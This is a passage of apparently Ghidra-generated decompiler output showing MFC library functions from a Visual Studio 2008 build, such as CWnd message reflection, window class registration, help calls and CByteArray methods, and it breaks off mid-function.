//  protected: int __thiscall CWnd::ReflectChildNotify(unsigned int,unsigned int,long,long *)
// 
// Library: Visual Studio 2008 Release

int __thiscall
CWnd::ReflectChildNotify(CWnd *this,uint param_1,uint param_2,long param_3,long *param_4)

{
  int iVar1;
  undefined local_10 [4];
  long *local_c;
  int local_8;
  
  if (param_1 < 0x112) {
    if (param_1 == 0x111) {
      iVar1 = CCmdTarget::OnCmdMsg
                        ((CCmdTarget *)this,0,param_2 >> 0x10 | 0xbd110000,(void *)0x0,
                         (AFX_CMDHANDLERINFO *)0x0);
      if (iVar1 == 0) {
        return 0;
      }
      if (param_4 != (long *)0x0) {
        *param_4 = 1;
        return 1;
      }
      return 1;
    }
    if (0x2a < param_1) {
      if ((param_1 < 0x30) || (param_1 == 0x39)) goto LAB_00412266;
      if (param_1 == 0x4e) {
        local_c = param_4;
        local_8 = param_3;
        iVar1 = CCmdTarget::OnCmdMsg
                          ((CCmdTarget *)this,0,*(uint *)(param_3 + 8) & 0xffff | 0xbc4e0000,
                           &local_c,(AFX_CMDHANDLERINFO *)0x0);
        return iVar1;
      }
    }
  }
  else if ((0x113 < param_1) && ((param_1 < 0x116 || (param_1 == 0x210)))) {
LAB_00412266:
    iVar1 = OnWndMsg(this,param_1 + 0xbc00,param_2,param_3,param_4);
    return iVar1;
  }
  if (param_1 - 0x132 < 7) {
    local_8 = param_1 - 0x132;
    local_c = (long *)param_2;
    iVar1 = OnWndMsg(this,0xbc19,0,(long)local_10,param_4);
    if (*param_4 != 0) {
      return iVar1;
    }
  }
  return 0;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x00412376)
// Library Function - Single Match
//  public: virtual long __thiscall CWnd::CreateAccessibleProxy(unsigned int,long,long *)
// 
// Library: Visual Studio 2008 Release

long __thiscall CWnd::CreateAccessibleProxy(CWnd *this,uint param_1,long param_2,long *param_3)

{
  long lVar1;
  LRESULT LVar2;
  int iVar3;
  IAccessibleProxy **local_14 [3];
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 4;
  local_8 = 0x4122ef;
  iVar3 = -0x7fffbffb;
  if ((param_2 == -4) && (iVar3 = (**(code **)(*(int *)this + 0x90))(), -1 < iVar3)) {
    if (*(LPUNKNOWN *)(this + 0x2c) == (LPUNKNOWN)0x0) {
      iVar3 = FUN_00411436(local_14);
      if (-1 < iVar3) {
        local_8 = 0;
        lVar1 = CMFCComObject<class_ATL::CAccessibleProxy>::QueryInterface<struct_IAccessibleProxy>
                          (local_14[0]);
        if (-1 < lVar1) {
          *(undefined4 *)(this + 0x2c) = 0;
          (**(code **)(iRam00000000 + 0xc))(0,this + 0x30,this + 0x34);
          LVar2 = LresultFromObject((IID *)&DAT_00429f64,param_1,*(LPUNKNOWN *)(this + 0x2c));
          *param_3 = LVar2;
        }
        iVar3 = 0;
      }
    }
    else {
      LVar2 = LresultFromObject((IID *)&DAT_00429f64,param_1,*(LPUNKNOWN *)(this + 0x2c));
      *param_3 = LVar2;
      iVar3 = 0;
    }
  }
  return iVar3;
}



// WARNING: Function: __EH_prolog3_catch_GS replaced with injection: EH_prolog3
// Library Function - Single Match
//  public: __thiscall CWaitCursor::~CWaitCursor(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CWaitCursor::~CWaitCursor(CWaitCursor *this)

{
  AfxGetModuleState();
  FUN_0040d561();
  FUN_0041696b();
  return;
}



undefined4 Catch_004123c3(void)

{
  int *piVar1;
  wchar_t *pwVar2;
  int iVar3;
  int unaff_EBP;
  
  FUN_0040b274((void *)(unaff_EBP + -0x418));
  piVar1 = *(int **)(unaff_EBP + -0x41c);
  iVar3 = *piVar1;
  *(undefined *)(unaff_EBP + -4) = 2;
  iVar3 = (**(code **)(iVar3 + 0xc))(unaff_EBP + -0x414,0x200,0);
  if (iVar3 == 0) {
    Format((void *)(unaff_EBP + -0x418),L"%s (%s:%d)");
  }
  else {
    Format((void *)(unaff_EBP + -0x418),L"%s (%s:%d)\n%s");
  }
  pwVar2 = *(wchar_t **)(unaff_EBP + -0x418);
  AfxMessageBox(pwVar2,0,0);
  *(undefined *)(unaff_EBP + -4) = 1;
  FUN_0040ae6f((int **)(pwVar2 + -8));
  (**(code **)(*piVar1 + 4))(1);
  return 0x4123bd;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// WARNING: Unable to track spacebase fully for stack
// Library Function - Multiple Matches With Different Base Names
//  public: virtual void __thiscall CWnd::WinHelpA(unsigned long,unsigned int)
//  public: virtual void __thiscall CWnd::WinHelpW(unsigned long,unsigned int)
// 
// Library: Visual Studio 2008 Release

BOOL FID_conflict_WinHelpW(HWND hWndMain,LPCWSTR lpszHelp,UINT uCommand,ULONG_PTR dwData)

{
  int iVar1;
  AFX_MODULE_STATE *pAVar2;
  CWnd *pCVar3;
  BOOL BVar4;
  CWnd *in_ECX;
  undefined4 *puVar5;
  undefined4 uStackY_34;
  
  pAVar2 = AfxGetModuleState();
  iVar1 = *(int *)(pAVar2 + 4);
  CWaitCursor::CWaitCursor((CWaitCursor *)((int)&hWndMain + 3));
  CWnd::PrepareForHelp(in_ECX);
  pCVar3 = CWnd::GetTopLevelParent(in_ECX);
  if (pCVar3 == (CWnd *)0x0) {
    AfxThrowNotSupportedException();
  }
  puVar5 = &uStackY_34;
  uStackY_34 = 0x4124b5;
  BVar4 = WinHelpW(*(HWND *)(pCVar3 + 0x20),*(LPCWSTR *)(iVar1 + 100),(UINT)lpszHelp,
                   (ULONG_PTR)hWndMain);
  if (BVar4 == 0) {
    puVar5[-1] = 0xffffffff;
    puVar5[-2] = 0;
    puVar5[-3] = 0xf107;
    puVar5[-4] = 0x4124c6;
    BVar4 = AfxMessageBox(puVar5[-3],puVar5[-2],puVar5[-1]);
  }
  puVar5[-1] = 0x4124d2;
  CWaitCursor::~CWaitCursor((CWaitCursor *)((int)&hWndMain + 3));
  puVar5[-1] = 0x4124d7;
  return BVar4;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Multiple Matches With Different Base Names
//  public: virtual void __thiscall CWnd::HtmlHelpA(unsigned long,unsigned int)
//  public: virtual void __thiscall CWnd::HtmlHelpW(unsigned long,unsigned int)
// 
// Library: Visual Studio 2008 Release

void __thiscall FID_conflict_HtmlHelpA(void *this,undefined4 param_1,undefined4 param_2)

{
  AFX_MODULE_STATE *pAVar1;
  CWnd *pCVar2;
  int iVar3;
  
  pAVar1 = AfxGetModuleState();
  iVar3 = *(int *)(pAVar1 + 4);
  CWaitCursor::CWaitCursor((CWaitCursor *)((int)&param_1 + 3));
  CWnd::PrepareForHelp((CWnd *)this);
  pCVar2 = CWnd::GetTopLevelParent((CWnd *)this);
  if (pCVar2 == (CWnd *)0x0) {
    AfxThrowNotSupportedException();
  }
  iVar3 = AfxHtmlHelp(*(undefined4 *)(pCVar2 + 0x20),*(undefined4 *)(iVar3 + 100),param_2,param_1);
  if (iVar3 == 0) {
    AfxMessageBox(0xf107,0,0xffffffff);
  }
  CWaitCursor::~CWaitCursor((CWaitCursor *)((int)&param_1 + 3));
  return;
}



// Library Function - Single Match
//  protected: virtual int __thiscall CWnd::OnChildNotify(unsigned int,unsigned int,long,long *)
// 
// Library: Visual Studio 2008 Release

int __thiscall CWnd::OnChildNotify(CWnd *this,uint param_1,uint param_2,long param_3,long *param_4)

{
  int iVar1;
  
  if (*(int *)(this + 0x50) != 0) {
    iVar1 = SendMessageA(this,param_1 + 0x2000,param_2,param_3);
    if ((6 < param_1 - 0x132) || (iVar1 != 0)) {
      if (param_4 != (long *)0x0) {
        *param_4 = iVar1;
      }
      iVar1 = 1;
    }
    return iVar1;
  }
  iVar1 = ReflectChildNotify(this,param_1,param_2,param_3,param_4);
  return iVar1;
}



undefined ** FUN_00412592(void)

{
  return &PTR_LAB_0042a14c;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  int __stdcall AfxRegisterClass(struct tagWNDCLASSA *)
// 
// Library: Visual Studio 2008 Release

int AfxRegisterClass(tagWNDCLASSA *param_1)

{
  BOOL BVar1;
  uint uVar2;
  AFX_MODULE_STATE *pAVar3;
  tagWNDCLASSW local_3c;
  undefined4 local_8;
  undefined4 uStack_4;
  
  uStack_4 = 0x30;
  local_8 = 0x4125a4;
  BVar1 = FID_conflict_AfxCtxGetClassInfoW
                    (*(HINSTANCE *)(param_1 + 0x10),*(LPCWSTR *)(param_1 + 0x24),&local_3c);
  if (BVar1 == 0) {
    uVar2 = FID_conflict_AfxCtxRegisterClassA((WNDCLASSW *)param_1);
    if ((short)uVar2 == 0) {
      return 0;
    }
    pAVar3 = AfxGetModuleState();
    if (pAVar3[0x14] != (AFX_MODULE_STATE)0x0) {
      AfxLockGlobals(1);
      local_8 = 0;
      pAVar3 = AfxGetModuleState();
      FID_conflict_operator__
                ((CSimpleStringT<wchar_t,0> *)(pAVar3 + 0x34),*(wchar_t **)(param_1 + 0x24));
      ATL::CSimpleStringT<wchar_t,0>::operator+=((CSimpleStringT<wchar_t,0> *)(pAVar3 + 0x34),'\n');
      local_8 = 0xffffffff;
      AfxUnlockGlobals(1);
    }
  }
  return 1;
}



void Catch_00412614(void)

{
  code *pcVar1;
  
  AfxUnlockGlobals(1);
  __CxxThrowException_8(0,(byte *)0x0);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  int __stdcall _AfxRegisterWithIcon(struct tagWNDCLASSA *,char const *,unsigned int)
// 
// Library: Visual Studio 2008 Release

int _AfxRegisterWithIcon(tagWNDCLASSA *param_1,char *param_2,uint param_3)

{
  AFX_MODULE_STATE *pAVar1;
  HICON pHVar2;
  int iVar3;
  
  *(char **)(param_1 + 0x24) = param_2;
  pAVar1 = AfxGetModuleState();
  pHVar2 = LoadIconW(*(HINSTANCE *)(pAVar1 + 0xc),(LPCWSTR)(param_3 & 0xffff));
  *(HICON *)(param_1 + 0x14) = pHVar2;
  if (pHVar2 == (HICON)0x0) {
    pHVar2 = LoadIconW((HINSTANCE)0x0,(LPCWSTR)0x7f00);
    *(HICON *)(param_1 + 0x14) = pHVar2;
  }
  iVar3 = AfxRegisterClass(param_1);
  return iVar3;
}



// Library Function - Single Match
//  int __stdcall AfxEndDeferRegisterClass(long)
// 
// Library: Visual Studio 2008 Release

int AfxEndDeferRegisterClass(long param_1)

{
  uint uVar1;
  AFX_MODULE_STATE *pAVar2;
  int iVar3;
  uint uVar4;
  uint local_38;
  code *local_34;
  undefined4 local_28;
  undefined4 local_20;
  undefined4 local_1c;
  wchar_t *local_14;
  undefined4 local_10;
  undefined4 local_c;
  AFX_MODULE_STATE *local_8;
  
  local_8 = AfxGetModuleState();
  param_1 = param_1 & ~*(uint *)(local_8 + 0x18);
  if (param_1 == 0) {
    uVar1 = 1;
  }
  else {
    uVar1 = 0;
    _memset(&local_38,0,0x28);
    local_34 = DefWindowProcW_exref;
    pAVar2 = AfxGetModuleState();
    local_28 = *(undefined4 *)(pAVar2 + 8);
    local_20 = DAT_00434350;
    local_10 = 8;
    if ((param_1 & 1U) != 0) {
      local_38 = 0xb;
      local_14 = L"AfxWnd90su";
      iVar3 = AfxRegisterClass((tagWNDCLASSA *)&local_38);
      if (iVar3 != 0) {
        uVar1 = 1;
      }
    }
    if ((param_1 & 0x20U) != 0) {
      local_38 = local_38 | 0x8b;
      local_14 = L"AfxOleControl90su";
      iVar3 = AfxRegisterClass((tagWNDCLASSA *)&local_38);
      if (iVar3 != 0) {
        uVar1 = uVar1 | 0x20;
      }
    }
    if ((param_1 & 2U) != 0) {
      local_38 = 0;
      local_14 = L"AfxControlBar90su";
      local_1c = 0x10;
      iVar3 = AfxRegisterClass((tagWNDCLASSA *)&local_38);
      if (iVar3 != 0) {
        uVar1 = uVar1 | 2;
      }
    }
    if ((param_1 & 4U) != 0) {
      local_38 = 8;
      local_1c = 0;
      iVar3 = _AfxRegisterWithIcon((tagWNDCLASSA *)&local_38,(char *)L"AfxMDIFrame90su",0x7a01);
      if (iVar3 != 0) {
        uVar1 = uVar1 | 4;
      }
    }
    if ((param_1 & 8U) != 0) {
      local_38 = 0xb;
      local_1c = 6;
      iVar3 = _AfxRegisterWithIcon((tagWNDCLASSA *)&local_38,(char *)L"AfxFrameOrView90su",0x7a02);
      if (iVar3 != 0) {
        uVar1 = uVar1 | 8;
      }
    }
    if ((param_1 & 0x10U) != 0) {
      local_c = 0xff;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x3fc0);
      uVar1 = uVar1 | uVar4;
      param_1 = param_1 & 0xffffc03f;
    }
    if ((param_1 & 0x40U) != 0) {
      local_c = 0x10;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x40);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x80U) != 0) {
      local_c = 2;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x80);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x100U) != 0) {
      local_c = 8;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x100);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x200U) != 0) {
      local_c = 0x20;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x200);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x400U) != 0) {
      local_c = 1;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x400);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x800U) != 0) {
      local_c = 0x40;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x800);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x1000U) != 0) {
      local_c = 4;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x1000);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x2000U) != 0) {
      local_c = 0x80;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x2000);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x4000U) != 0) {
      local_c = 0x800;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x4000);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x8000U) != 0) {
      local_c = 0x400;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x8000);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x10000U) != 0) {
      local_c = 0x200;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x10000);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x20000U) != 0) {
      local_c = 0x100;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x20000);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x40000U) != 0) {
      local_c = 0x8000;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x40000);
      uVar1 = uVar1 | uVar4;
    }
    if ((param_1 & 0x80000U) != 0) {
      local_c = 0x1000;
      uVar4 = _AfxInitCommonControls((tagINITCOMMONCONTROLSEX *)&local_10,0x80000);
      uVar1 = uVar1 | uVar4;
    }
    *(uint *)(local_8 + 0x18) = *(uint *)(local_8 + 0x18) | uVar1;
    if ((*(uint *)(local_8 + 0x18) & 0x3fc0) == 0x3fc0) {
      *(uint *)(local_8 + 0x18) = *(uint *)(local_8 + 0x18) | 0x10;
      uVar1 = uVar1 | 0x10;
    }
    uVar1 = (uint)((uVar1 & param_1) == param_1);
  }
  return uVar1;
}



// Library Function - Multiple Matches With Same Base Name
//  public: virtual int __thiscall CWnd::PreCreateWindow(struct tagCREATESTRUCTA &)
//  public: virtual int __thiscall CWnd::PreCreateWindow(struct tagCREATESTRUCTW &)
// 
// Library: Visual Studio 2008 Release

undefined4 PreCreateWindow(int param_1)

{
  if (*(int *)(param_1 + 0x28) == 0) {
    AfxEndDeferRegisterClass(1);
    *(wchar_t **)(param_1 + 0x28) = L"AfxWnd90su";
  }
  return 1;
}



void __fastcall FUN_00412980(int param_1)

{
                    // WARNING: Could not recover jumptable at 0x0041298b. Too many branches
                    // WARNING: Treating indirect jump as call
  (**(code **)(**(int **)(param_1 + 0x4c) + 0x58))();
  return;
}



// Library Function - Single Match
//  public: unsigned long __thiscall CWnd::GetExStyle(void)const 
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

ulong __thiscall CWnd::GetExStyle(CWnd *this)

{
  ulong uVar1;
  
  if (*(int *)(this + 0x50) == 0) {
    uVar1 = GetWindowLongW(*(HWND *)(this + 0x20),-0x10);
    return uVar1;
  }
                    // WARNING: Could not recover jumptable at 0x004129a5. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = (**(code **)(**(int **)(this + 0x50) + 0x78))();
  return uVar1;
}



// Library Function - Single Match
//  public: unsigned long __thiscall CWnd::GetExStyle(void)const 
// 
// Library: Visual Studio 2008 Release

ulong __thiscall CWnd::GetExStyle(CWnd *this)

{
  ulong uVar1;
  
  if (*(int *)(this + 0x50) == 0) {
    uVar1 = GetWindowLongW(*(HWND *)(this + 0x20),-0x14);
    return uVar1;
  }
                    // WARNING: Could not recover jumptable at 0x004129bf. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = (**(code **)(**(int **)(this + 0x50) + 0x7c))();
  return uVar1;
}



// Library Function - Single Match
//  public: int __thiscall CWnd::IsWindowEnabled(void)const 
// 
// Library: Visual Studio 2008 Release

int __thiscall CWnd::IsWindowEnabled(CWnd *this)

{
  BOOL BVar1;
  int iVar2;
  
  if (*(int *)(this + 0x50) == 0) {
    BVar1 = ::IsWindowEnabled(*(HWND *)(this + 0x20));
    return BVar1;
  }
                    // WARNING: Could not recover jumptable at 0x004129d7. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar2 = (**(code **)(**(int **)(this + 0x50) + 0xa4))();
  return iVar2;
}



// Library Function - Single Match
//  public: int __thiscall CWnd::EnableWindow(int)
// 
// Library: Visual Studio 2008 Release

int __thiscall CWnd::EnableWindow(CWnd *this,int param_1)

{
  BOOL BVar1;
  int iVar2;
  
  if (*(int *)(this + 0x50) == 0) {
    BVar1 = ::EnableWindow(*(HWND *)(this + 0x20),param_1);
    return BVar1;
  }
                    // WARNING: Could not recover jumptable at 0x004129fe. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar2 = (**(code **)(**(int **)(this + 0x50) + 0xa8))();
  return iVar2;
}



// Library Function - Single Match
//  public: int __thiscall CWnd::SetWindowPos(class CWnd const *,int,int,int,int,unsigned int)
// 
// Library: Visual Studio 2008 Release

int __thiscall
CWnd::SetWindowPos(CWnd *this,CWnd *param_1,int param_2,int param_3,int param_4,int param_5,
                  uint param_6)

{
  BOOL BVar1;
  int iVar2;
  
  if (*(int *)(this + 0x50) == 0) {
    if (param_1 != (CWnd *)0x0) {
      param_1 = *(CWnd **)(param_1 + 0x20);
    }
    BVar1 = ::SetWindowPos(*(HWND *)(this + 0x20),(HWND)param_1,param_2,param_3,param_4,param_5,
                           param_6);
    return BVar1;
  }
                    // WARNING: Could not recover jumptable at 0x00412a3c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar2 = (**(code **)(**(int **)(this + 0x50) + 0x9c))();
  return iVar2;
}



// Library Function - Single Match
//  protected: void __thiscall CWnd::AttachControlSite(class CHandleMap *)
// 
// Library: Visual Studio 2008 Release

void __thiscall CWnd::AttachControlSite(CWnd *this,CHandleMap *param_1)

{
  HWND pHVar1;
  void *pvVar2;
  
  if ((this != (CWnd *)0x0) && (*(int *)(this + 0x50) == 0)) {
    pHVar1 = GetParent(*(HWND *)(this + 0x20));
    pvVar2 = CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(param_1 + 0x1c),pHVar1);
    if ((pvVar2 != (void *)0x0) && (*(int *)((int)pvVar2 + 0x4c) != 0)) {
      (**(code **)(**(int **)((int)pvVar2 + 0x4c) + 0x9c))(this,0);
    }
  }
  return;
}



// Library Function - Single Match
//  void __stdcall AfxSetWindowText(struct HWND__ *,wchar_t const *)
// 
// Library: Visual Studio 2008 Release

void AfxSetWindowText(HWND__ *param_1,wchar_t *param_2)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  WCHAR local_208;
  undefined local_206 [510];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  if (param_1 != (HWND__ *)0x0) goto LAB_00412aad;
  do {
    AfxThrowNotSupportedException();
LAB_00412aad:
  } while (param_2 == (wchar_t *)0x0);
  uVar1 = lstrlenW(param_2);
  local_208 = L'\0';
  _memset(local_206,0,0x1fe);
  if (uVar1 < 0x101) {
    uVar2 = GetWindowTextW(param_1,&local_208,0x100);
    if (uVar2 == uVar1) {
      iVar3 = lstrcmpW(&local_208,param_2);
      if (iVar3 == 0) goto LAB_00412b0e;
    }
  }
  SetWindowTextW(param_1,param_2);
LAB_00412b0e:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  void __stdcall AfxDeleteObject(void * *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void AfxDeleteObject(void **param_1)

{
  if (param_1 == (void **)0x0) {
    AfxThrowNotSupportedException();
  }
  if (*param_1 != (HGDIOBJ)0x0) {
    DeleteObject(*param_1);
    *param_1 = (void *)0x0;
  }
  return;
}



// Library Function - Single Match
//  void __stdcall AfxGlobalFree(void *)
// 
// Library: Visual Studio 2008 Release

void AfxGlobalFree(void *param_1)

{
  UINT UVar1;
  uint uVar2;
  
  if (param_1 != (void *)0x0) {
    UVar1 = GlobalFlags(param_1);
    for (uVar2 = UVar1 & 0xff; uVar2 != 0; uVar2 = uVar2 - 1) {
      GlobalUnlock(param_1);
    }
    GlobalFree(param_1);
  }
  return;
}



// Library Function - Single Match
//  int __cdecl AfxCriticalNewHandler(unsigned int)
// 
// Library: Visual Studio 2008 Release

int __cdecl AfxCriticalNewHandler(uint param_1)

{
  code *pcVar1;
  _AFX_THREAD_STATE *p_Var2;
  size_t sVar3;
  int iVar4;
  
  p_Var2 = AfxGetThreadState();
  if ((p_Var2 != (_AFX_THREAD_STATE *)0x0) && (*(void **)(p_Var2 + 0xc) != (void *)0x0)) {
    sVar3 = __msize(*(void **)(p_Var2 + 0xc));
    if (param_1 + 4 < sVar3) {
      __expand(*(void **)(p_Var2 + 0xc),(sVar3 - param_1) - 4);
    }
    else {
      _free(*(void **)(p_Var2 + 0xc));
      *(undefined4 *)(p_Var2 + 0xc) = 0;
    }
    return 1;
  }
  FUN_0040a59b();
  pcVar1 = (code *)swi(3);
  iVar4 = (*pcVar1)();
  return iVar4;
}



// Library Function - Single Match
//  struct HWND__ * __stdcall _AfxChildWindowFromPoint(struct HWND__ *,struct tagPOINT)
// 
// Library: Visual Studio 2008 Release

HWND__ * _AfxChildWindowFromPoint(HWND__ *param_1,tagPOINT param_2)

{
  POINT pt;
  int iVar1;
  uint uVar2;
  BOOL BVar3;
  UINT uCmd;
  tagRECT local_14;
  
  ClientToScreen(param_1,&param_2);
  uCmd = 5;
  do {
    param_1 = GetWindow(param_1,uCmd);
    if (param_1 == (HWND)0x0) {
      return (HWND__ *)0x0;
    }
    iVar1 = GetDlgCtrlID(param_1);
    if ((iVar1 != 0xffff) && (uVar2 = GetWindowLongW(param_1,-0x10), (uVar2 & 0x10000000) != 0)) {
      GetWindowRect(param_1,&local_14);
      pt.y = param_2.y;
      pt.x = param_2.x;
      BVar3 = PtInRect(&local_14,pt);
      if (BVar3 != 0) {
        return param_1;
      }
    }
    uCmd = 2;
  } while( true );
}



undefined ** FUN_00412c47(void)

{
  return &PTR_s_CByteArray_00432a5c;
}



void __fastcall FUN_00412c64(undefined4 *param_1)

{
  *param_1 = CByteArray::vftable;
  FUN_0040a3fc((void *)param_1[1]);
  return;
}



// Library Function - Single Match
//  public: void __thiscall CByteArray::SetSize(int,int)
// 
// Library: Visual Studio 2008 Release

void __thiscall CByteArray::SetSize(CByteArray *this,int param_1,int param_2)

{
  int _Size;
  void *_Dst;
  int iVar1;
  void *_Val;
  
  _Size = param_1;
  _Val = (void *)0x0;
  if (-1 < param_1) goto LAB_00412c8c;
  do {
    AfxThrowNotSupportedException();
LAB_00412c8c:
    if ((int)_Val <= param_2) {
      *(int *)(this + 0x10) = param_2;
    }
    if ((void *)_Size == _Val) {
      FUN_0040a3fc(*(void **)(this + 4));
      *(void **)(this + 0xc) = _Val;
      *(void **)(this + 8) = _Val;
      goto LAB_00412d7c;
    }
    if (*(void **)(this + 4) == _Val) {
      _Dst = operator_new(_Size);
      *(void **)(this + 4) = _Dst;
      _memset(_Dst,(int)_Val,_Size);
      *(int *)(this + 0xc) = _Size;
LAB_00412cf3:
      *(int *)(this + 8) = _Size;
      return;
    }
    _Val = *(void **)(this + 0xc);
    if (_Size <= (int)_Val) {
      iVar1 = *(int *)(this + 8);
      if (iVar1 < _Size) {
        _memset((void *)(iVar1 + (int)*(void **)(this + 4)),0,_Size - iVar1);
      }
      goto LAB_00412cf3;
    }
    iVar1 = *(int *)(this + 0x10);
    if (iVar1 == 0) {
      iVar1 = (int)(*(int *)(this + 8) + (*(int *)(this + 8) >> 0x1f & 7U)) >> 3;
      if (iVar1 < 4) {
LAB_00412d25:
        iVar1 = 4;
      }
      else if (iVar1 < 0x401) {
        if (iVar1 < 4) goto LAB_00412d25;
      }
      else {
        iVar1 = 0x400;
      }
    }
    param_1 = iVar1 + (int)_Val;
    if (iVar1 + (int)_Val <= _Size) {
      param_1 = _Size;
    }
  } while (param_1 < (int)_Val);
  _Val = operator_new(param_1);
  FUN_0040be3a(_Val,param_1,*(void **)(this + 4),*(rsize_t *)(this + 8));
  _memset((void *)(*(int *)(this + 8) + (int)_Val),0,_Size - *(int *)(this + 8));
  FUN_0040a3fc(*(void **)(this + 4));
  *(int *)(this + 8) = _Size;
  *(int *)(this + 0xc) = param_1;
LAB_00412d7c:
  *(void **)(this + 4) = _Val;
  return;
}



// Library Function - Single Match
//  public: virtual void __thiscall CByteArray::Serialize(class CArchive &)
// 
// Library: Visual Studio 2008 Release

void __thiscall CByteArray::Serialize(CByteArray *this,CArchive *param_1)

{
  ulong uVar1;
  void *pvVar2;
  uint uVar3;
  uint uVar4;
  
  if ((~*(uint *)(param_1 + 0x18) & 1) == 0) {
    uVar1 = CArchive::ReadCount(param_1);
    SetSize(this,uVar1,-1);
    pvVar2 = *(void **)(this + 4);
    for (uVar4 = *(uint *)(this + 8); uVar4 != 0; uVar4 = uVar4 - uVar3) {
      uVar3 = 0x7fffffff;
      if (uVar4 < 0x7fffffff) {
        uVar3 = uVar4;
      }
      CArchive::EnsureRead(param_1,pvVar2,uVar3);
      pvVar2 = (void *)((int)pvVar2 + uVar3);
    }
  }
  else {
    CArchive::WriteCount(param_1,*(ulong *)(this + 8));
    pvVar2 = *(void **)(this + 4);
    for (uVar4 = *(uint *)(this + 8); uVar4 != 0; uVar4 = uVar4 - uVar3) {
      uVar3 = 0x7fffffff;
      if (uVar4 < 0x7fffffff) {
        uVar3 = uVar4;
      }
      CArchive::Write(param_1,pvVar2,uVar3);
      pvVar2 = (void *)((int)pvVar2 + uVar3);
    }
  }
  return;
}



undefined4 * __thiscall FUN_00412e1c(void *this,byte param_1)

{
  FUN_00412c64((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  void __stdcall AfxFormatStrings(class ATL::CStringT<wchar_t,class StrTraitMFC<wchar_t,class
// ATL::ChTraitsCRT<wchar_t> > > &,wchar_t const *,wchar_t const * const *,int)
// 
// Library: Visual Studio 2008 Release

void AfxFormatStrings(CStringT<wchar_t,class_StrTraitMFC<wchar_t,class_ATL::ChTraitsCRT<wchar_t>_>_>
                      *param_1,wchar_t *param_2,wchar_t **param_3,int param_4)

{
  wchar_t wVar1;
  LPCWSTR lpString;
  int iVar2;
  wchar_t *pwVar3;
  int iVar4;
  wchar_t *pwVar5;
  
  pwVar5 = param_2;
  if (param_2 != (wchar_t *)0x0) goto LAB_00412e52;
  do {
    AfxThrowNotSupportedException();
LAB_00412e52:
  } while (param_3 == (wchar_t **)0x0);
  param_2 = (wchar_t *)0x0;
  wVar1 = *pwVar5;
  pwVar3 = pwVar5;
  while (wVar1 != L'\0') {
    if (*pwVar3 == L'%') {
      wVar1 = pwVar3[1];
      if (((ushort)wVar1 < 0x31) || (0x39 < (ushort)wVar1)) {
        if (((ushort)wVar1 < 0x41) || (0x5a < (ushort)wVar1)) goto LAB_00412eb6;
        if ((ushort)wVar1 < 0x3a) goto LAB_00412e95;
        iVar2 = (ushort)wVar1 - 0x38;
      }
      else {
LAB_00412e95:
        iVar2 = (ushort)wVar1 - 0x31;
      }
      pwVar3 = pwVar3 + 2;
      if (param_4 <= iVar2) goto LAB_00412eb8;
      if (param_3[iVar2] != (LPCWSTR)0x0) {
        iVar2 = lstrlenW(param_3[iVar2]);
        param_2 = (wchar_t *)((int)param_2 + iVar2);
      }
    }
    else {
LAB_00412eb6:
      pwVar3 = pwVar3 + 1;
LAB_00412eb8:
